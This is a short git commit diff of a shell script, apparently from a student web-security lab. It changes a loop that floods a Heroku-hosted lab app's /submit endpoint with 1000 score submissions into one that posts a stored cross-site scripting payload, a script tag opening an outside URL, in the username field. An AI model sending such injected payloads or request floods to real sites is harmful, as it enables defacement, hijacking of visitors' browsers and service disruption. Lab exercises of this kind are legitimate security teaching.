72554333b67ca233d62d338b5b8870885b3f8e39
Hayden Wolff <haydenwolff99@gmail.com>
2018-12-05 23:22:21 -0500

    almost done

--- security/overload.sh
+++ security/overload.sh
@@ -1,8 +1,9 @@
 #!/bin/bash
 
-for ((i=1; i<=1000; i++))
+for ((i=1; i<=2; i++))
 	do
-		curl --data "username=attack!&score=300&grid={}" https://lab8-11-7-18.herokuapp.com/submit
+		echo "HI"
+		curl --data "username=<script>window.open('http://gph.is/2d4jD6G')</script>&score=1800&grid={}" https://lab8-11-7-18.herokuapp.com/submit
 	done
 echo "done"
 
